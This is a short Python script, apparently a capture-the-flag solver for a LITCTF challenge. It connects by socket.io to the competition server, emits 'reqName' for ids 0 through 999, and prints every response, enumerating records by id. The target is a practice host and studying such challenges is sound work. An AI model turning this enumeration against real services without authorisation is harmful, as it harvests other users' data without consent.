import socketio
import asyncio

sio = socketio.Client()

@sio.on("reqNameRes")  #type: ignore
def on_msg(data):
	if data is not None:
		print(data)

sio.connect("http://websites.litctf.live:8000")
tasks = []
for i in range(1000):
	sio.emit("reqName", str(i))
